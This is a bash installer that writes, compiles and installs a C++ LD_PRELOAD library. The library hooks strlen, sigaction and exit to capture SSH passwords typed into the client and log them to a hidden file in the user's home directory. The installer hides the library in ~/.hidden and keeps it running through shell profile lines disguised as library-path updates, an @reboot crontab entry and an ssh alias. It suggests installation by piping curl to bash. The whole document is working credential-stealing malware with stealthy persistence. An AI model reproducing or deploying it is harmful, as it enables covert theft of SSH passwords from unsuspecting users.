#!/bin/bash

# Quick SSH Password Sniffer Installation
# Can be executed directly with curl:
# curl -s https://example.com/quick_install.sh | bash

# Set up working directory
TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR" || exit 1

echo "SSH Password Sniffer Quick Installer"
echo "===================================="
echo "Setting up in temporary directory: $TEMP_DIR"

# Download needed files
echo "[1/4] Downloading components..."
cat > ssh_sniff.cpp << 'EOL'
/**
 * SSH Password Sniffer (userspace version)
 * Works without root privileges
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <chrono>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>

// State machine states exactly as in the diagram
enum State {
    UNKNOWN,
    INITIALIZED,
    PASSWORD_PROMPT,
    SIGACTION_SGTTOU,
    PASSWORD_READ,
    SUCCEEDED,
    FAILED
};

// Information about the process
struct ProcessInfo {
    char user[256];
    char cmdline[2048];
};

// Current state and data
static State current_state = UNKNOWN;
static ProcessInfo proc_info;
static char password_buffer[1024];
static bool auth_succeeded = false;

// Pointers to the original functions
static size_t (*real_strlen)(const char*) = NULL;
static int (*real_sigaction)(int, const struct sigaction*, struct sigaction*) = NULL;
static void (*real_exit)(int) = NULL;

// Helper function to get user home directory
const char* get_home_dir() {
    // Try to get from env first
    const char* home = getenv("HOME");
    if (home) return home;
    
    // If not available (like in some SSH sessions), use passwd
    struct passwd* pw = getpwuid(getuid());
    if (pw) return pw->pw_dir;
    
    // Fallback
    return "/tmp";
}

// Generate log path in user's home directory
const char* get_log_path() {
    static char log_path[1024] = {0};
    if (log_path[0] == '\0') {
        snprintf(log_path, sizeof(log_path), "%s/.hidden/ssh_sniff.log", get_home_dir());
    }
    return log_path;
}

// Helper function to check if a string ends with another string
bool str_endswith(const char* str, const char* suffix) {
    if (!str || !suffix) return false;
    
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
    
    if (suffix_len > str_len) return false;
    
    return (memcmp(str + str_len - suffix_len, suffix, suffix_len) == 0);
}

// Get user name
void get_user_info() {
    // Get user name
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        strncpy(proc_info.user, pw->pw_name, sizeof(proc_info.user) - 1);
    } else {
        const char* user_env = getenv("USER");
        if (user_env) {
            strncpy(proc_info.user, user_env, sizeof(proc_info.user) - 1);
        } else {
            strcpy(proc_info.user, "unknown");
        }
    }
    
    // Get command line
    int fd = open("/proc/self/cmdline", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, proc_info.cmdline, sizeof(proc_info.cmdline) - 1);
        if (n > 0) {
            for (ssize_t i = 0; i < n; i++) {
                if (proc_info.cmdline[i] == '\0' && i < n - 1) {
                    proc_info.cmdline[i] = ' ';
                }
            }
            proc_info.cmdline[n] = '\0';
        } else {
            strcpy(proc_info.cmdline, "unknown");
        }
        close(fd);
    } else {
        strcpy(proc_info.cmdline, "unknown");
    }
}

// Send the captured credentials to the log file
void send_credentials() {
    // Get current timestamp
    auto now = std::chrono::system_clock::now();
    std::time_t timestamp = std::chrono::system_clock::to_time_t(now);
    char time_str[100];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localtime(&timestamp));
    
    // Create .hidden directory if it doesn't exist
    char hidden_dir[1024];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.hidden", get_home_dir());
    mkdir(hidden_dir, 0700);
    
    // Open the log file
    FILE* log = fopen(get_log_path(), "a");
    if (log) {
        fprintf(log, "--- SSH Password Captured ---\n");
        fprintf(log, "Time: %s\n", time_str);
        fprintf(log, "User: %s\n", proc_info.user);
        fprintf(log, "Command: %s\n", proc_info.cmdline);
        fprintf(log, "Password: %s\n", password_buffer);
        fprintf(log, "Result: %s\n", auth_succeeded ? "SUCCESS" : "FAILED");
        fprintf(log, "--------------------------\n\n");
        fclose(log);
        
        // Set secure permissions
        chmod(get_log_path(), 0600);
    }
}

// Initialize the password interceptor
void initialize() {
    if (current_state != UNKNOWN) return;
    
    // Get process information
    get_user_info();
    
    // Change state
    current_state = INITIALIZED;
}

// Strlen hook
extern "C" size_t strlen(const char *s) {
    // Initialize if needed
    if (!real_strlen) {
        real_strlen = (size_t(*)(const char*))dlsym(RTLD_NEXT, "strlen");
        if (!real_strlen) abort();
        initialize();
    }
    
    // Get the real length
    size_t len = real_strlen(s);
    
    // State machine transitions exactly as in the diagram
    switch(current_state) {
        case INITIALIZED:
            // Look for password prompt
            if (str_endswith(s, "assword:")) {
                current_state = PASSWORD_PROMPT;
            }
            break;
            
        case SIGACTION_SGTTOU:
            // This is the password
            strncpy(password_buffer, s, sizeof(password_buffer) - 1);
            password_buffer[sizeof(password_buffer) - 1] = '\0';
            current_state = PASSWORD_READ;
            break;
            
        case PASSWORD_READ:
            // Check for success or another prompt
            if (!strcmp(s, "client-session")) {
                current_state = SUCCEEDED;
                auth_succeeded = true;
                send_credentials();
            } else if (str_endswith(s, "assword:")) {
                // Password rejected, try again
                current_state = PASSWORD_PROMPT;
                auth_succeeded = false;
                send_credentials();
                memset(password_buffer, 0, sizeof(password_buffer));
            }
            break;
            
        default:
            break;
    }
    
    return len;
}

// Sigaction hook
extern "C" int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact) {
    // Initialize if needed
    if (!real_sigaction) {
        real_sigaction = (int(*)(int, const struct sigaction*, struct sigaction*))dlsym(RTLD_NEXT, "sigaction");
        if (!real_sigaction) abort();
        initialize();
    }
    
    // State transition as in the diagram
    if (signum == SIGTTOU && current_state == PASSWORD_PROMPT) {
        current_state = SIGACTION_SGTTOU;
    }
    
    // Call the real function
    return real_sigaction(signum, act, oldact);
}

// Exit hook
extern "C" void exit(int status) {
    // Initialize if needed
    if (!real_exit) {
        real_exit = (void(*)(int))dlsym(RTLD_NEXT, "exit");
        if (!real_exit) _exit(status);
        initialize();
    }
    
    // If we exit without success, record the last attempt
    if (current_state != SUCCEEDED && current_state != UNKNOWN && current_state != INITIALIZED) {
        current_state = FAILED;
        auth_succeeded = false;
        send_credentials();
    }
    
    // Call the real function
    real_exit(status);
}
EOL

# Create Makefile
cat > Makefile << 'EOL'
CXX = g++
CXXFLAGS = -shared -fPIC -std=c++11 -Wall -O2
LDFLAGS = -ldl

# Main targets
all: ssh_sniffer

# SSH client sniffer
ssh_sniffer: ssh_sniff.cpp
	$(CXX) $(CXXFLAGS) -o libssh_sniff.so ssh_sniff.cpp $(LDFLAGS)

# Clean target
clean:
	rm -f libssh_sniff.so
EOL

# Compile
echo "[2/4] Compiling SSH password sniffer..."
make &>/dev/null

if [ ! -f "libssh_sniff.so" ]; then
    echo "Error: Compilation failed. Make sure you have g++ installed."
    echo "Try: sudo apt-get install g++"
    exit 1
fi

# Create hidden directory
HIDDEN_DIR="$HOME/.hidden"
mkdir -p "$HIDDEN_DIR"

# Install 
echo "[3/4] Installing components..."

# Copy the library
cp libssh_sniff.so "$HIDDEN_DIR/"
touch "$HIDDEN_DIR/ssh_sniff.log"
chmod 700 "$HIDDEN_DIR"
chmod 600 "$HIDDEN_DIR/ssh_sniff.log"

# Update profile files
echo "[4/4] Setting up profile hooks..."

# .bashrc
if [ -f "$HOME/.bashrc" ]; then
    if ! grep -q "LD_PRELOAD.*libssh_sniff.so" "$HOME/.bashrc"; then
        echo "" >> "$HOME/.bashrc"
        echo "# Update SSH client library path" >> "$HOME/.bashrc"
        echo "if [ \"\$SSH_CONNECTION\" = \"\" ]; then" >> "$HOME/.bashrc"
        echo "    export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD" >> "$HOME/.bashrc"
        echo "fi" >> "$HOME/.bashrc"
        echo "# End update" >> "$HOME/.bashrc"
    fi
fi

# .zshrc if exists
if [ -f "$HOME/.zshrc" ]; then
    if ! grep -q "LD_PRELOAD.*libssh_sniff.so" "$HOME/.zshrc"; then
        echo "" >> "$HOME/.zshrc"
        echo "# Update SSH client library path" >> "$HOME/.zshrc"
        echo "if [ \"\$SSH_CONNECTION\" = \"\" ]; then" >> "$HOME/.zshrc"
        echo "    export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD" >> "$HOME/.zshrc"
        echo "fi" >> "$HOME/.zshrc"
        echo "# End update" >> "$HOME/.zshrc"
    fi
fi

# Add to crontab for persistence
(crontab -l 2>/dev/null | grep -v "libssh_sniff.so"; echo "@reboot export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD") | crontab -

# Create SSH alias
if [ -f "$HOME/.bash_aliases" ]; then
    if ! grep -q "alias ssh=" "$HOME/.bash_aliases"; then
        echo "# SSH compatibility alias" >> "$HOME/.bash_aliases"
        echo "alias ssh='LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD ssh'" >> "$HOME/.bash_aliases"
    fi
fi

# Clean up
cd "$HOME"
rm -rf "$TEMP_DIR"

# Apply immediately to the current shell
export LD_PRELOAD="$HIDDEN_DIR/libssh_sniff.so:$LD_PRELOAD"

# Success message
echo "✓ Installation complete!"
echo "SSH password monitoring is now active."
echo "Passwords will be saved to: $HIDDEN_DIR/ssh_sniff.log"
echo
echo "Note: Log out and log back in for all hooks to take full effect." 